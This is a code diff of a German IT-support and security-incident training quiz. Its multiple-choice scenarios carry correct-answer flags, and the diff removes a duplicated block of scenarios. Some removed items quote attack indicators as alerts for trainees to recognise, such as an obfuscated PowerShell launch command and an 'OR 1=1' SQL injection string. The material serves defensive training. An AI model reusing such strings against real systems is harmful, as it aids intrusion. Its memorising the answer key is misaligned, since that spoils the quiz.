@@ -1576,7 +1576,7 @@ const baseScenarios = [
   {
     id: 144,
     title: "Geplante Aufgabe erstellt",
-    description: "Auf einem Server wurde ein Scheduled Task erstellt, der nachts ein Skript aus C:\Temp startet.",
+    description: "Auf einem Server wurde ein Scheduled Task erstellt, der nachts ein Skript aus C:\\Temp startet.",
     options: [
       { text: "Den Task löschen und die Datei im Temp-Ordner analysieren; den Server auf Kompromittierung prüfen.", isCorrect: true },
       { text: "Die Ausführungszeit auf den Tag verschieben.", isCorrect: false },
@@ -1870,8 +1870,7 @@ const baseScenarios = [
     ],
     feedback: "Korrekt! Häufig wählen Anwendungen wie Teams falsche Audiogeräte aus oder werden durch die Windows-Datenschutzeinstellungen für das Mikrofon blockiert."
   },
-
-{
+  {
   "id": 171,
   "title": "VPN Client Fehler 412",
   "description": "Ein Nutzer meldet: VPN Client Fehler 412. Wie gehst du vor?",
@@ -1891,7 +1890,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 172,
   "title": "Outlook Offline",
   "description": "Ein Nutzer meldet: Outlook Offline. Wie gehst du vor?",
@@ -1911,7 +1910,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 173,
   "title": "OneDrive Sync hakt",
   "description": "Ein Nutzer meldet: OneDrive Sync hakt. Wie gehst du vor?",
@@ -1931,7 +1930,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 174,
   "title": "Drucker druckt kryptisch",
   "description": "Ein Nutzer meldet: Drucker druckt kryptisch. Wie gehst du vor?",
@@ -1951,7 +1950,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 175,
   "title": "Sharepoint Zugriff verweigert",
   "description": "Ein Nutzer meldet: Sharepoint Zugriff verweigert. Wie gehst du vor?",
@@ -1971,7 +1970,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 176,
   "title": "Bluescreen (BSOD)",
   "description": "Ein Nutzer meldet: Bluescreen (BSOD). Wie gehst du vor?",
@@ -1991,7 +1990,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 177,
   "title": "Excel stürzt ab",
   "description": "Ein Nutzer meldet: Excel stürzt ab. Wie gehst du vor?",
@@ -2011,7 +2010,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 178,
   "title": "Bitlocker PIN vergessen",
   "description": "Ein Nutzer meldet: Bitlocker PIN vergessen. Wie gehst du vor?",
@@ -2031,7 +2030,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 179,
   "title": "Kein Internet (Proxy Fehler)",
   "description": "Ein Nutzer meldet: Kein Internet (Proxy Fehler). Wie gehst du vor?",
@@ -2051,7 +2050,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 180,
   "title": "Netzwerk sehr langsam",
   "description": "Ein Nutzer meldet: Netzwerk sehr langsam. Wie gehst du vor?",
@@ -2071,7 +2070,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 181,
   "title": "VM startet nicht",
   "description": "Ein Nutzer meldet: VM startet nicht. Wie gehst du vor?",
@@ -2091,7 +2090,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 182,
   "title": "AD Replikation fehlerhaft",
   "description": "Ein Nutzer meldet: AD Replikation fehlerhaft. Wie gehst du vor?",
@@ -2111,7 +2110,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 183,
   "title": "Docker Container OOM",
   "description": "Ein Nutzer meldet: Docker Container OOM. Wie gehst du vor?",
@@ -2131,7 +2130,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 184,
   "title": "SQL Server hohe CPU",
   "description": "Ein Nutzer meldet: SQL Server hohe CPU. Wie gehst du vor?",
@@ -2151,7 +2150,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 185,
   "title": "Exchange Queue staut sich",
   "description": "Ein Nutzer meldet: Exchange Queue staut sich. Wie gehst du vor?",
@@ -2171,7 +2170,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 186,
   "title": "Intranet Seite down",
   "description": "Ein Nutzer meldet: Intranet Seite down. Wie gehst du vor?",
@@ -2191,7 +2190,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 187,
   "title": "Mac SMB Verbindung schlägt fehl",
   "description": "Ein Nutzer meldet: Mac SMB Verbindung schlägt fehl. Wie gehst du vor?",
@@ -2211,7 +2210,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 188,
   "title": "User Account ständig gesperrt",
   "description": "Ein Nutzer meldet: User Account ständig gesperrt. Wie gehst du vor?",
@@ -2231,7 +2230,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 189,
   "title": "Monitor flackert",
   "description": "Ein Nutzer meldet: Monitor flackert. Wie gehst du vor?",
@@ -2251,7 +2250,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 190,
   "title": "Laptop Akku sofort leer",
   "description": "Ein Nutzer meldet: Laptop Akku sofort leer. Wie gehst du vor?",
@@ -2271,7 +2270,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 191,
   "title": "iPhone lädt nicht",
   "description": "Ein Nutzer meldet: iPhone lädt nicht. Wie gehst du vor?",
@@ -2291,7 +2290,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 192,
   "title": "SCCM Deployment Fehler",
   "description": "Ein Nutzer meldet: SCCM Deployment Fehler. Wie gehst du vor?",
@@ -2311,7 +2310,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 193,
   "title": "Linux Server nicht pingbar",
   "description": "Ein Nutzer meldet: Linux Server nicht pingbar. Wie gehst du vor?",
@@ -2331,7 +2330,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 194,
   "title": "WLAN extrem langsam",
   "description": "Ein Nutzer meldet: WLAN extrem langsam. Wie gehst du vor?",
@@ -2351,7 +2350,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 195,
   "title": "SAP GUI reagiert nicht",
   "description": "Ein Nutzer meldet: SAP GUI reagiert nicht. Wie gehst du vor?",
@@ -2371,7 +2370,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 196,
   "title": "Git Push Permission Denied",
   "description": "Ein Nutzer meldet: Git Push Permission Denied. Wie gehst du vor?",
@@ -2391,7 +2390,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 197,
   "title": "Veeam Backup Fehler",
   "description": "Ein Nutzer meldet: Veeam Backup Fehler. Wie gehst du vor?",
@@ -2411,7 +2410,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 198,
   "title": "RDP Verbindung bricht ab",
   "description": "Ein Nutzer meldet: RDP Verbindung bricht ab. Wie gehst du vor?",
@@ -2431,7 +2430,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 199,
   "title": "Cisco AnyConnect Fehler",
   "description": "Ein Nutzer meldet: Cisco AnyConnect Fehler. Wie gehst du vor?",
@@ -2451,7 +2450,7 @@ const baseScenarios = [
   ],
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
-{
+  {
   "id": 200,
   "title": "Zoom Kamera schwarz",
   "description": "Ein Nutzer meldet: Zoom Kamera schwarz. Wie gehst du vor?",
@@ -2472,557 +2471,7 @@ const baseScenarios = [
   "feedback": "Korrekt! Dies ist ein klassisches IT-Problem (False Positive in Bezug auf Security)."
 },
   {
-    id: 121,
-    title: "RODC (Read-Only Domain Controller) Setup",
-    description: "Eine neue Außenstelle ohne sicheren Serverraum benötigt eine lokale Authentifizierung.",
-    options: [
-      { text: "Einen normalen DC aufstellen.", isCorrect: false },
-      { text: "Einen RODC installieren, um das Risiko bei Diebstahl zu minimieren.", isCorrect: true },
-      { text: "Keinen DC verwenden, nur VPN.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Ein RODC bietet lokale Authentifizierung ohne eine schreibbare Kopie der Active Directory Datenbank zu enthalten."
-  },
-  {
-    id: 122,
-    title: "Druckerwarteschlange hängt",
-    description: "Ein Nutzer meldet, dass er nicht drucken kann und Dokumente in der Warteschlange stecken.",
-    options: [
-      { text: "Drucker neu kaufen.", isCorrect: false },
-      { text: "Den Dienst 'Druckerwarteschlange' (Spooler) neu starten und temporäre Dateien löschen.", isCorrect: true },
-      { text: "Dem Nutzer das Drucken verbieten.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Oft hängt sich der Spooler-Dienst auf oder eine korrupte Druckdatei blockiert die Queue."
-  },
-  {
-    id: 123,
-    title: "Outlook startet nicht (OST defekt)",
-    description: "Outlook bleibt beim Starten hängen oder meldet, dass die Datendatei nicht geöffnet werden kann.",
-    options: [
-      { text: "Die .ost Datei löschen/umbenennen und von Exchange neu synchronisieren lassen.", isCorrect: true },
-      { text: "Windows komplett neu installieren.", isCorrect: false },
-      { text: "Auf Webmail verweisen und Outlook deinstallieren.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Die OST-Datei ist nur ein lokaler Cache. Durch Löschen wird sie beim nächsten Start sauber neu erstellt."
-  },
-  {
-    id: 124,
-    title: "DHCP-Scope erschöpft",
-    description: "Neue Geräte im WLAN erhalten keine IP-Adresse (APIPA 169.254.x.x).",
-    options: [
-      { text: "Alle alten Geräte vom Netz trennen.", isCorrect: false },
-      { text: "Lease-Time verringern und ggf. den IP-Bereich im DHCP-Server vergrößern.", isCorrect: true },
-      { text: "Statische IPs für alle Geräte vergeben.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Bei vielen kurzzeitigen Geräten hilft eine kurze Lease-Time, ansonsten muss das Subnetz vergrößert werden."
-  },
-  {
-    id: 125,
-    title: "VPN-Verbindungsabbrüche (MTU)",
-    description: "Nutzer können sich per VPN verbinden, aber interne Webseiten laden nicht oder Verbindungen brechen bei großen Dateien ab.",
-    options: [
-      { text: "MTU-Size (Maximum Transmission Unit) auf dem VPN-Interface anpassen.", isCorrect: true },
-      { text: "Internetgeschwindigkeit beim Provider erhöhen.", isCorrect: false },
-      { text: "VPN-Server neustarten.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Eine zu große MTU führt bei VPN-Tunneln durch den Overhead zu fragmentierten, oft verworfenen Paketen."
-  },
-  {
-    id: 126,
-    title: "BitLocker-Recovery-Screen",
-    description: "Ein Notebook startet nach einem BIOS-Update direkt in die BitLocker-Wiederherstellung.",
-    options: [
-      { text: "Den Recovery-Key aus dem Active Directory / Intune auslesen und eingeben.", isCorrect: true },
-      { text: "Das Gerät formatieren.", isCorrect: false },
-      { text: "Den TPM-Chip ausbauen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! BIOS-Updates ändern oft Hardware-Signaturen (PCR-Werte im TPM), was BitLocker als möglichen Angriff wertet."
-  },
-  {
-    id: 127,
-    title: "Postfach ist voll",
-    description: "Ein Nutzer kann keine E-Mails mehr senden oder empfangen, da das 50GB Limit erreicht ist.",
-    options: [
-      { text: "Online-Archiv (In-Place Archive) aktivieren und Aufbewahrungsrichtlinien anwenden.", isCorrect: true },
-      { text: "Einfach unbegrenzten Speicher zuweisen.", isCorrect: false },
-      { text: "Ein zweites Postfach für den Nutzer anlegen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Das Online-Archiv verlagert alte Mails in einen separaten Speicher, ohne das primäre Postfach zu belasten."
-  },
-  {
-    id: 128,
-    title: "User Profile Service failed the logon",
-    description: "Ein Nutzer kann sich an seinem PC nicht anmelden, Windows meldet einen Fehler beim Laden des Profils.",
-    options: [
-      { text: "Den PC wegwerfen.", isCorrect: false },
-      { text: "Im Abgesicherten Modus booten, den .bak Registry-Key für das Profil reparieren oder das Profil neu anlegen.", isCorrect: true },
-      { text: "Passwort zurücksetzen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Ein beschädigtes lokales Profil in der Registry (ProfileList) ist meist die Ursache für diesen Windows-Fehler."
-  },
-  {
-    id: 129,
-    title: "NTFS- vs. Freigabeberechtigungen",
-    description: "Ein Nutzer hat NTFS-Vollzugriff auf einen Ordner, kann aber über den Netzwerkpfad nichts ändern.",
-    options: [
-      { text: "Die Freigabeberechtigungen (Share Permissions) überprüfen, da diese den Zugriff zusätzlich einschränken können.", isCorrect: true },
-      { text: "Dem Nutzer Domänen-Admin Rechte geben.", isCorrect: false },
-      { text: "Ordner lokal auf den PC des Nutzers kopieren.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Es gilt immer die restriktivste Berechtigung aus NTFS- und Share-Berechtigungen."
-  },
-  {
-    id: 130,
-    title: "RDP-Sitzungslimit erreicht",
-    description: "Zugriff auf einen Windows-Server per RDP schlägt fehl, da keine weiteren Verbindungen zugelassen sind.",
-    options: [
-      { text: "Den Server hard-resetten.", isCorrect: false },
-      { text: "Über die Admin-Konsole (mstsc /admin) verbinden und getrennte, alte Sitzungen beenden.", isCorrect: true },
-      { text: "RDP-Port in der Firewall freigeben.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Ohne Terminalserver-Lizenz erlaubt Windows Server nur 2 gleichzeitige RDP-Verbindungen."
-  },
-  {
-    id: 131,
-    title: "WSUS synchronisiert nicht",
-    description: "Der interne Update-Server (WSUS) lädt keine neuen Updates mehr von Microsoft herunter.",
-    options: [
-      { text: "WSUS-Dienst neu starten und ggf. die WsusPool-AppPool in IIS recyceln/erweitern.", isCorrect: true },
-      { text: "WSUS deinstallieren und Clients direkt ins Internet lassen.", isCorrect: false },
-      { text: "Warten, Microsoft Server sind oft offline.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Ein vollgelaufener Application Pool Memory im IIS ist ein sehr häufiges Problem bei WSUS."
-  },
-  {
-    id: 132,
-    title: "Hyper-V Checkpoint füllt Festplatte",
-    description: "Eine VM pausiert plötzlich. Die physische Festplatte des Hyper-V Hosts ist zu 100% voll durch .avhdx Dateien.",
-    options: [
-      { text: "Die VM löschen.", isCorrect: false },
-      { text: "Speicherplatz freimachen und die Checkpoints über den Hyper-V Manager mergen lassen.", isCorrect: true },
-      { text: "Einfach die .avhdx Dateien im Explorer löschen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Das manuelle Löschen von Checkpoint-Dateien zerstört die VM. Sie müssen über den Manager zusammengeführt (merged) werden."
-  },
-  {
-    id: 133,
-    title: "Netzwerk-Loop (Switch)",
-    description: "Das gesamte Netzwerk fällt aus. An einem Switch blinken alle LEDs synchron wie verrückt.",
-    options: [
-      { text: "Spanning Tree Protocol (STP) prüfen, den betroffenen Port finden und abschalten.", isCorrect: true },
-      { text: "Den Switch durch einen billigen Unmanaged Switch ersetzen.", isCorrect: false },
-      { text: "Alle Netzwerkkabel im Gebäude neu verlegen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Ein Kabel, das in denselben Switch zurückgesteckt wurde, verursacht einen Broadcast-Storm, wenn STP nicht aktiv/korrekt konfiguriert ist."
-  },
-  {
-    id: 134,
-    title: "RADIUS-Zertifikat abgelaufen",
-    description: "Kein Mitarbeiter kann sich mehr mit dem Firmen-WLAN (802.1X EAP) verbinden.",
-    options: [
-      { text: "Zertifikat des RADIUS/NPS-Servers erneuern und den Dienst neu starten.", isCorrect: true },
-      { text: "WLAN-Passwort für alle auf ein offenes Netz ändern.", isCorrect: false },
-      { text: "Alle Access Points austauschen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Bei Enterprise-WLAN authentifiziert sich auch der Server beim Client. Ein abgelaufenes Zertifikat bricht den EAP-Handshake ab."
-  },
-  {
-    id: 135,
-    title: "Gruppenrichtlinie (GPO) wird nicht übernommen",
-    description: "Ein neues Netzlaufwerk via GPO taucht bei den Usern nicht auf.",
-    options: [
-      { text: "GPO löschen.", isCorrect: false },
-      { text: "Auf dem Client 'gpupdate /force' ausführen und im Event-Log/gpresult prüfen.", isCorrect: true },
-      { text: "Den Usern zeigen, wie sie Laufwerke manuell mappen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! gpresult /r zeigt an, ob die GPO überhaupt angewendet wurde. gpupdate erzwingt den Abruf."
-  },
-  {
-    id: 136,
-    title: "Impossible Travel Alert",
-    description: "SOC meldet: Ein Benutzer meldet sich um 09:00 Uhr aus Frankfurt an und um 09:15 Uhr aus Tokio.",
-    options: [
-      { text: "Dies ist physisch unmöglich. Den Account sofort sperren und Passwörter zurücksetzen.", isCorrect: true },
-      { text: "Ignorieren, er könnte sehr schnell geflogen sein.", isCorrect: false },
-      { text: "Den User fragen, wie das Wetter in Tokio ist.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Entweder wird ein VPN/Proxy genutzt oder der Account wurde kompromittiert. Sperren ist die sicherste Reaktion."
-  },
-  {
-    id: 137,
-    title: "Suspicious PowerShell Encoded Command",
-    description: "EDR meldet: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc <Base64String>",
-    options: [
-      { text: "Den String ignorieren, Base64 ist normale Verschlüsselung.", isCorrect: false },
-      { text: "Prozess blockieren, PC isolieren und den Base64-String dekodieren, um die Payload zu analysieren.", isCorrect: true },
-      { text: "Den User abmahnen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Angreifer nutzen oft Base64-kodierte Commands, um Antiviren-Signaturen zu umgehen (Obfuscation)."
-  },
-  {
-    id: 138,
-    title: "LSASS Dump blockiert",
-    description: "EDR meldet, dass ein Prozess versucht hat, den Speicher von lsass.exe auszulesen.",
-    options: [
-      { text: "Den Host sofort isolieren und auf Credential-Dumping (z.B. Mimikatz) untersuchen.", isCorrect: true },
-      { text: "Den Prozess erlauben, LSASS muss oft gelesen werden.", isCorrect: false },
-      { text: "Den Rechner neustarten.", isCorrect: false },
-    ],
-    feedback: "Korrekt! LSASS speichert Passwort-Hashes. Ein Lesezugriff durch unbekannte Prozesse ist fast immer der Versuch eines Credential Thefts."
-  },
-  {
-    id: 139,
-    title: "Honeypot ausgelöst",
-    description: "Ein Zugriff auf eine Datei namens 'passwords_admin.txt' auf einem versteckten Share (Honeypot) wurde protokolliert.",
-    options: [
-      { text: "Die Datei umbenennen, damit sie niemand findet.", isCorrect: false },
-      { text: "Sofortigen Alarm schlagen, die Quell-IP untersuchen und isolieren, da es sich um Lateral Movement handelt.", isCorrect: true },
-      { text: "Die Datei mit echten Passwörtern füllen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Ein Honeypot hat keinen legitimen Einsatzzweck für Nutzer. Jeder Zugriff ist per Definition verdächtig/böswillig."
-  },
-  {
-    id: 140,
-    title: "Massenhafte Dateiumbenennung",
-    description: "Auf einem Fileshare werden hunderte Dateien pro Minute von .docx in .locked umbenannt.",
-    options: [
-      { text: "Den ausführenden Client ermitteln, sofort vom Netz trennen und Incident Response Plan starten.", isCorrect: true },
-      { text: "Dateien wieder manuell in .docx umbenennen.", isCorrect: false },
-      { text: "Den Fileserver ausschalten und hoffen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Dies ist das typische Verhalten einer Ransomware-Verschlüsselung. Geschwindigkeit und Isolation sind hier kritisch."
-  },
-  {
-    id: 141,
-    title: "Cleartext HTTP Traffic zu unbekannter IP",
-    description: "IDS meldet HTTP-Verbindungen über Port 80 an eine IP ohne Domänennamen, die Payload enthält verschlüsselte Blobs.",
-    options: [
-      { text: "Die IP in der Firewall sperren und den infizierten Client auf C2 (Command & Control) Beaconing prüfen.", isCorrect: true },
-      { text: "Port 80 ist für Web-Surfen normal, Alarm schließen.", isCorrect: false },
-      { text: "Den ISP bitten, die IP zu löschen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Malware nutzt oft HTTP (Port 80), um Firewalls zu umgehen, verschleiert die Daten aber im Body. Ein direkter IP-Aufruf ohne DNS ist verdächtig."
-  },
-  {
-    id: 142,
-    title: "Neuer Domain Admin",
-    description: "Ein unbekannter Benutzer wurde um 3:00 Uhr nachts der Gruppe 'Domain Admins' hinzugefügt.",
-    options: [
-      { text: "Dem Nutzer eine Willkommens-E-Mail schreiben.", isCorrect: false },
-      { text: "Konto sofort deaktivieren, den Ersteller-Account identifizieren und als kompromittiert behandeln.", isCorrect: true },
-      { text: "Die Gruppe in 'Lokale Admins' umbenennen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Unautorisierte Privilegienerweiterung (Privilege Escalation / Persistence) ist ein kritischer Vorfall."
-  },
-  {
-    id: 143,
-    title: "SMBv1 im Netzwerk",
-    description: "Vulnerability Scanner meldet, dass auf mehreren Servern SMBv1 aktiviert ist.",
-    options: [
-      { text: "SMBv1 via GPO komplett deaktivieren und Patches prüfen (Schutz vor WannaCry).", isCorrect: true },
-      { text: "SMBv1 ist für alte Drucker wichtig, also anlassen.", isCorrect: false },
-      { text: "Die Firewall intern komplett abschalten.", isCorrect: false },
-    ],
-    feedback: "Korrekt! SMBv1 ist veraltet und hochgradig verwundbar (z.B. EternalBlue). Es sollte netzwerkweit deaktiviert sein."
-  },
-  {
-    id: 144,
-    title: "Geplante Aufgabe erstellt",
-    description: "Auf einem Server wurde ein Scheduled Task erstellt, der nachts ein Skript aus C:\Temp startet.",
-    options: [
-      { text: "Den Task löschen und die Datei im Temp-Ordner analysieren; den Server auf Kompromittierung prüfen.", isCorrect: true },
-      { text: "Die Ausführungszeit auf den Tag verschieben.", isCorrect: false },
-      { text: "Den Temp-Ordner einfach leeren.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Geplante Aufgaben (Scheduled Tasks) sind ein beliebter Weg für Malware, um Persistenz (Überleben von Neustarts) zu erreichen."
-  },
-  {
-    id: 145,
-    title: "Unautorisierter USB-Stick",
-    description: "Ein Mitarbeiter in der R&D-Abteilung steckt einen USB-Stick ein. Die Endpoint Protection blockiert ihn.",
-    options: [
-      { text: "Den Block umgehen, damit er arbeiten kann.", isCorrect: false },
-      { text: "Den Vorfall dokumentieren, den USB-Stick einziehen und auf Schadsoftware / Datenabfluss prüfen.", isCorrect: true },
-      { text: "Den Stick formatieren.", isCorrect: false },
-    ],
-    feedback: "Korrekt! USB-Sticks können Malware (z.B. Stuxnet) einschleusen oder zum Diebstahl geistigen Eigentums genutzt werden."
-  },
-  {
-    id: 146,
-    title: "DGA (Domain Generation Algorithm)",
-    description: "Ein Client fragt im Sekundentakt hunderte zufällig generierte Domains (z.B. xkqjwd.com) am DNS-Server an.",
-    options: [
-      { text: "Host isolieren. Dies ist typisch für Malware, die ihren C2-Server sucht (DGA).", isCorrect: true },
-      { text: "Einen besseren DNS-Server installieren.", isCorrect: false },
-      { text: "Die Domains alle im Vorfeld blockieren.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Malware nutzt DGA, um täglich neue Domains zu generieren, um statische IP-Sperren zu umgehen."
-  },
-  {
-    id: 147,
-    title: "Port 3389 offen im Internet",
-    description: "Ein externer Scan zeigt, dass Port 3389 (RDP) an der externen Firewall für einen internen Server offen ist.",
-    options: [
-      { text: "Die Firewall-Regel sofort deaktivieren. Zugriff nur noch über VPN oder ein sicheres Gateway erlauben.", isCorrect: true },
-      { text: "Ein starkes Passwort vergeben und offen lassen.", isCorrect: false },
-      { text: "Den Port auf 3390 ändern.", isCorrect: false },
-    ],
-    feedback: "Korrekt! RDP direkt ins Internet freizugeben ist extrem fahrlässig und führt oft zu Ransomware-Infektionen."
-  },
-  {
-    id: 148,
-    title: "Insider Threat Helpdesk",
-    description: "Ein Helpdesk-Mitarbeiter setzt ohne Ticket Passwörter von Geschäftsführern zurück.",
-    options: [
-      { text: "Ihn befördern, er ist sehr proaktiv.", isCorrect: false },
-      { text: "Den Account des Mitarbeiters sperren, Vorfall eskalieren und betroffene Manager-Accounts prüfen.", isCorrect: true },
-      { text: "Das Passwort-Tool deinstallieren.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Unautorisierte Passwort-Resets von VIP-Accounts sind ein starker Indikator für böswillige Insider oder Account-Übernahme."
-  },
-  {
-    id: 149,
-    title: "Web Shell auf DMZ Server",
-    description: "Der Datei-Monitor meldet die Erstellung einer 'shell.php' im Upload-Verzeichnis eines Webservers.",
-    options: [
-      { text: "Die Datei isolieren/löschen, den Webserver für eine Forensik sichern und nach der Schwachstelle (z.B. fehlende Validierung) suchen.", isCorrect: true },
-      { text: "Die Datei in .txt umbenennen.", isCorrect: false },
-      { text: "Den Apache-Dienst neu starten.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Eine Web-Shell erlaubt Angreifern Remote Code Execution (RCE) über den Browser. Der Server gilt als kompromittiert."
-  },
-  {
-    id: 150,
-    title: "Tor Exit Node Traffic",
-    description: "Die Firewall blockiert Datenverkehr von einem internen Server zu einer IP, die als Tor Exit Node bekannt ist.",
-    options: [
-      { text: "Tor-Browser für alle freigeben.", isCorrect: false },
-      { text: "Den Server isolieren. Malware nutzt das Tor-Netzwerk oft zur Verschleierung der Kommunikation.", isCorrect: true },
-      { text: "Die Firewall-Regel löschen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Datenverkehr aus dem Firmennetzwerk in das Tor-Netzwerk ist fast immer ein Zeichen für eine aktive Infektion."
-  },
-  {
-    id: 151,
-    title: "Unerwartete EDR Isolation",
-    description: "Der EDR-Agent hat den PC des CFO automatisch vom Netzwerk getrennt. Der CFO ruft wütend an.",
-    options: [
-      { text: "Netzwerk sofort freischalten, es ist der CFO!", isCorrect: false },
-      { text: "Dem CFO die Situation erklären und die EDR-Logs prüfen. Die Sicherheit geht vor.", isCorrect: true },
-      { text: "Dem CFO einen neuen PC kaufen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! VIPs sind besonders gefährdet (Whaling). EDR-Isolierungen dürfen nie ohne vorherige Prüfung aufgehoben werden."
-  },
-  {
-    id: 152,
-    title: "Lateral Movement über WMI",
-    description: "SOC meldet WMI-Befehle (Windows Management Instrumentation), die von einem Arbeitsplatz auf mehrere Server ausgeführt werden.",
-    options: [
-      { text: "Den Arbeitsplatz isolieren und untersuchen, ob es ein legitimer Admin-Task oder ein Angreifer ist.", isCorrect: true },
-      { text: "WMI ist ein normales Windows Feature, ignorieren.", isCorrect: false },
-      { text: "WMI auf allen Rechnern deinstallieren.", isCorrect: false },
-    ],
-    feedback: "Korrekt! WMI ist ein mächtiges Admin-Tool, das von Angreifern oft für Lateral Movement (z.B. Ausführen von Prozessen remote) missbraucht wird."
-  },
-  {
-    id: 153,
-    title: "Firewall Regel manipuliert",
-    description: "Ein Account, der nicht dem Netzwerk-Team gehört, hat eine Regel in der Firewall hinzugefügt (Any-Any allow).",
-    options: [
-      { text: "Die Regel sofort deaktivieren und den Account des Nutzers sperren.", isCorrect: true },
-      { text: "Die Regel so lassen, das Netzwerk-Team wird es schon richten.", isCorrect: false },
-      { text: "Den Nutzer loben.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Eine 'Any-Any allow'-Regel hebelt die gesamte Sicherheit aus. Dies deutet auf eine schwerwiegende Kompromittierung hin."
-  },
-  {
-    id: 154,
-    title: "SQL Injection (WAF blockt)",
-    description: "Die Web Application Firewall blockt dutzende Anfragen mit 'OR 1=1' in einem Login-Feld.",
-    options: [
-      { text: "WAF abschalten, um False Positives zu vermeiden.", isCorrect: false },
